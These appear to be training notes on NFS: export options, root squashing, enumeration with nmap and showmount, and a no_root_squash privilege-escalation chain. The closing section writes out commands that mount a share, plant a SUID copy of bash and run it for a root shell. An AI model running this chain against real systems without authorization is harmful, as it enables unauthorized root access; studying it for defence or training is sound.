# Introduction to NFS

## What is NFS?

**Network File System (NFS)** allows a Linux machine to share directories with other machines over a network. A remote server exports a folder, and a client mounts it locally — the directory appears and behaves identically to a local folder, with changes syncing back in real time.

- Operates at the **application layer** over TCP/IP (port **2049**).
- Uses **Remote Procedure Calls (RPC)** for communication.
- Client needs the `nfs-common` package; server runs the NFS daemon (`nfsd`).

```
Kali (client)  ←── Network ──→  Target (server)
                                  exports /home
```

## NFS Configuration — `/etc/exports`

The server-side file **`/etc/exports`** defines which directories are exported, who can connect, and what permissions are granted.

**Example entry:**

```
/home *(rw,no_root_squash)
```

| Option              | Meaning                                                                 |
| ------------------- | ----------------------------------------------------------------------- |
| `*`                 | Any host on the network can mount this share                            |
| `rw`                | Read and write access                                                   |
| `ro`                | Read-only access                                                        |
| `sync`              | Writes are committed to the server immediately                          |
| `insecure`          | Allows connections from ports above 1024                                |
| `no_subtree_check`  | Disables subtree checking for performance                               |
| `root_squash`       | **(Default)** Maps remote root to `nobody` — safe                       |
| `no_root_squash`    | Remote root retains full root privileges on the share — **dangerous**   |
| `no_all_squash`     | Preserves user context for all users (not just root)                    |

## Root Squashing — `root_squash` vs `no_root_squash`

### Default behaviour (`root_squash`)

```
Kali root
    │
    ▼
Target NFS
    │
    ▼
Treated as "nobody" (unprivileged)
```

The server **squashes** remote root requests — even if you are root on the client, you are demoted to `nobody` on the server. This prevents the client from modifying sensitive server files.

### Misconfigured (`no_root_squash`)

```
Kali root
    │
    ▼
Target NFS
    │
    ▼
Still treated as root
```

Remote root privileges are **not squashed**. If you are root on your client, you act with full root authority over the mounted share.

### Analogy

Think of a security guard at the door:

- **`root_squash`** — The guard sees someone claiming to be root and **strips their privileges**.
- **`no_root_squash`** — The guard **lets the root identity through** with full privileges.

## Enumeration

### Nmap NFS script

```bash
nmap --script=nfs-showmount <TARGET_IP>
```

### showmount

```bash
showmount -e <TARGET_IP>
```

Both reveal exported directories and their access restrictions.

## Exploitation Chain — `no_root_squash` Privilege Escalation

```
1. Find NFS share (showmount / nmap)
       ↓
2. Share is writable (rw)
       ↓
3. no_root_squash is enabled
       ↓
4. Mount share → create/copy a binary as root
       ↓
5. Set SUID bit on the binary (chmod +s)
       ↓
6. Execute the SUID binary from low-priv shell on target → root shell
```

### Step-by-step

1. **Mount the NFS share** on your attacking machine (as root).
2. **Copy or compile a shell binary** (e.g., `/bin/bash` or an msfvenom payload) onto the mounted share.
3. **Set the SUID bit** — `chmod +s binary`. Because `no_root_squash` is active, the file is owned by root and the SUID bit is preserved.
4. **Execute on the target** — from a low-privileged shell, run the SUID binary to get root.

```bash
# On attacker (as root)
mkdir /tmp/nfs
mount -t nfs <TARGET_IP>:<share> /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod +s /tmp/nfs/bash

# On victim (as low-priv user)
./bash -p
```

> [!important] Key Point
> Writing a file as root does **not** automatically give you a root shell. The target must **execute** the SUID binary for privilege escalation to occur.

---

## Key Takeaways

> **NFS** = Shared folder over the network.

> **`no_root_squash`** = Remote root is not downgraded.

> **Writable share + SUID binary + privileged execution = Root shell.**
